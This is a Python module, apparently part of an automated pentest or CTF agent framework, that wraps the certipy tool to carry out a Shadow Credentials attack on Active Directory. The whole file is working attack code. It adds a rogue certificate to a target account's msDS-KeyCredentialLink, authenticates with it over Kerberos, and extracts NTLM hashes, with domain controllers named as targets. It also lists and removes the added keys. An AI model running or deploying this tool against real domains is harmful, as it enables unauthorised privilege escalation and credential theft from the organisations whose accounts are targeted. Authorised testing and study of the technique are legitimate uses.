# tools/shadow_credentials_tool.py
"""
Shadow Credentials攻击工具

漏洞原理：
- 滥用msDS-KeyCredentialLink属性
- 向目标对象添加恶意证书
- 使用证书进行Kerberos认证
- 获取目标NTLM哈希或TGT

适用场景：
- 域环境
- 有WriteProperty权限
- 目标对象启用了PKINIT

利用对象：
- 用户账户
- 计算机账户（域控）
- 服务账户

CTF场景优化:
- 自动检测工具可用性
- 一键添加证书并认证

集成：
- app.logger
- tool_framework
"""

from typing import Dict, Any, Optional, List
import subprocess
import os
import re

from tool_framework import CommandLineTool

# 集成日志
try:
    from app.logger import get_logger
except ImportError:
    from logger import get_logger

logger = get_logger("ShadowCredentials")


class ShadowCredentialsTool(CommandLineTool):
    """Shadow Credentials攻击工具"""

    # 前置条件声明
    REQUIRES_CREDENTIALS = True
    REQUIRES_SHELL_SESSION = False
    TOOL_CATEGORY = "attacker"
    REQUIRES_OS = "any"

    def __init__(self):
        self.timeout = 300
        super().__init__("certipy")

    def name(self) -> str:
        return "shadow-credentials"

    def description(self) -> str:
        return "Shadow Credentials攻击工具，通过msDS-KeyCredentialLink添加恶意证书获取目标凭据"

    def supported_vulns(self) -> list:
        return ["Shadow Credentials", "PKINIT", "Key Credential Link", "AD CS"]

    def capability_statement(self) -> str:
        return "Shadow Credentials攻击工具。需要域凭据和WriteProperty权限。可向目标添加恶意证书并认证获取凭据。适合：域环境提权、域控攻击。"

    def check_available(self) -> bool:
        # 检查certipy或pywhisker（pipx安装，使用shutil.which检测）
        import shutil
        if shutil.which("certipy"):
            return True
        if shutil.which("pywhisker"):
            return True
        return False

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "action": {
                "type": "str",
                "description": "操作: add/list/remove/auth",
                "required": True
            },
            "target": {
                "type": "str",
                "description": "目标用户/计算机账户",
                "required": True
            },
            "domain": {
                "type": "str",
                "description": "域名",
                "required": True
            },
            "dc_ip": {
                "type": "str",
                "description": "域控IP",
                "required": True
            },
            "username": {
                "type": "str",
                "description": "当前用户名",
                "required": True
            },
            "password": {
                "type": "str",
                "description": "当前用户密码",
                "required": True
            },
            "pfx_path": {
                "type": "str",
                "description": "PFX证书路径（auth操作需要）",
                "required": False
            },
            "device_id": {
                "type": "str",
                "description": "证书设备ID（remove操作需要）",
                "required": False
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        """执行Shadow Credentials操作"""
        action = params.get("action", "add")
        target_account = params.get("target", target)
        domain = params.get("domain", "")
        dc_ip = params.get("dc_ip", "")
        username = params.get("username", "")
        password = params.get("password", "")

        action_map = {
            "add": self._add_certificate,
            "list": self._list_certificates,
            "remove": self._remove_certificate,
            "auth": self._authenticate
        }

        handler = action_map.get(action)
        if not handler:
            return {"error": f"不支持的操作: {action}", "success": False}

        return handler(target_account, domain, dc_ip, username, password, params)

    def _add_certificate(self, target: str, domain: str, dc_ip: str,
                         username: str, password: str, params: Dict) -> Dict:
        """添加恶意证书"""
        results = {"success": True, "certificate": None}

        if not all([target, domain, dc_ip, username, password]):
            return {"error": "缺少必要参数", "success": False}

        logger.info(f"[ShadowCreds] 添加证书到: {target}")

        try:
            # 优先使用certipy
            cmd = [
                "certipy", "shadow",
                "-account", target,
                "-u", f"{username}@{domain}",
                "-p", password,
                "-dc-ip", dc_ip
            ]

            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=self.timeout
            )

            if result.returncode == 0:
                output = result.stdout
                results["output"] = output

                # 提取证书路径
                pfx_match = re.search(r"saved to (\S+\.pfx)", output)
                if pfx_match:
                    results["certificate"] = pfx_match.group(1)

                # 提取NTLM哈希
                ntlm_match = re.search(r"NTLM[:\s]+([a-f0-9]{32})", output, re.IGNORECASE)
                if ntlm_match:
                    results["ntlm_hash"] = ntlm_match.group(1)

                logger.info(f"[ShadowCreds] 证书添加成功")
            else:
                results["success"] = False
                results["error"] = result.stderr

        except FileNotFoundError:
            results["success"] = False
            results["error"] = "certipy不可用，请安装: pip install certipy"
        except Exception as e:
            results["success"] = False
            results["error"] = str(e)

        return results

    def _list_certificates(self, target: str, domain: str, dc_ip: str,
                           username: str, password: str, params: Dict) -> Dict:
        """列出目标对象的证书"""
        results = {"success": True, "certificates": []}

        try:
            cmd = [
                "certipy", "shadow",
                "-account", target,
                "-u", f"{username}@{domain}",
                "-p", password,
                "-dc-ip", dc_ip,
                "-list"
            ]

            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=self.timeout
            )

            if result.returncode == 0:
                output = result.stdout
                device_ids = re.findall(r"DeviceID[:\s]+([a-f0-9-]+)", output, re.IGNORECASE)

                for device_id in device_ids:
                    results["certificates"].append({"device_id": device_id})

                results["raw_output"] = output

        except Exception as e:
            results["success"] = False
            results["error"] = str(e)

        return results

    def _remove_certificate(self, target: str, domain: str, dc_ip: str,
                            username: str, password: str, params: Dict) -> Dict:
        """移除证书"""
        results = {"success": True}

        device_id = params.get("device_id")
        if not device_id:
            return {"error": "需要提供device_id", "success": False}

        try:
            cmd = [
                "certipy", "shadow",
                "-account", target,
                "-u", f"{username}@{domain}",
                "-p", password,
                "-dc-ip", dc_ip,
                "-remove",
                "-device-id", device_id
            ]

            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=self.timeout
            )

            if result.returncode == 0:
                results["output"] = result.stdout
            else:
                results["success"] = False
                results["error"] = result.stderr

        except Exception as e:
            results["success"] = False
            results["error"] = str(e)

        return results

    def _authenticate(self, target: str, domain: str, dc_ip: str,
                      username: str, password: str, params: Dict) -> Dict:
        """使用证书进行认证"""
        results = {"success": True, "credentials": {}}

        pfx_path = params.get("pfx_path")
        if not pfx_path:
            return {"error": "需要提供证书路径", "success": False}

        try:
            cmd = [
                "certipy", "auth",
                "-pfx", pfx_path,
                "-dc-ip", dc_ip
            ]

            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=self.timeout
            )

            if result.returncode == 0:
                output = result.stdout
                results["output"] = output

                ntlm_match = re.search(r"NTLM[:\s]+([a-f0-9]{32})", output, re.IGNORECASE)
                if ntlm_match:
                    results["credentials"]["ntlm_hash"] = ntlm_match.group(1)

                user_match = re.search(r"Username[:\s]+(\S+)", output)
                if user_match:
                    results["credentials"]["username"] = user_match.group(1)

                logger.info(f"[ShadowCreds] 认证成功，获取凭据")
            else:
                results["success"] = False
                results["error"] = result.stderr

        except Exception as e:
            results["success"] = False
            results["error"] = str(e)

        return results


# 全局实例
_shadow_credentials_tool = None


def get_shadow_credentials_tool() -> ShadowCredentialsTool:
    global _shadow_credentials_tool
    if _shadow_credentials_tool is None:
        _shadow_credentials_tool = ShadowCredentialsTool()
    return _shadow_credentials_tool


def register():
    from tool_framework import ToolRegistry
    ToolRegistry.register(ShadowCredentialsTool())